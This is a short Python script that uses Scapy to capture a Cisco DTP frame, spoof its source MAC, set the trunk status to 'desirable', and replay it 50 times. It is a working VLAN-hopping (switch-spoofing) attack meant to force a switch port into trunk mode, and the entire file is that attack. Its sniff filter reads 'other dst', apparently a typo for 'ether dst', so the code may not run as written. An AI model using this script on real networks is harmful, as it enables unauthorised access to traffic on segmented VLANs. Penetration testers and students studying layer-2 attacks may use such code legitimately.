from scapy.all import *
import time
load_contrib('dtp')
#Catpure DTP Frame
pkt = sniff(filter='other dst 01:00:0c:cc:cc:cc', count=1)
#Change the Mac address
pkt[0].src='00:00:00:11:11:11'
#Change to desirable
pkt[0][DTP][DTPStatus].status='\x03'
#Send into network
for i in range(0,50):
    sendp(pkt[0], loop=0, verbose=1)
    time.sleep(5)
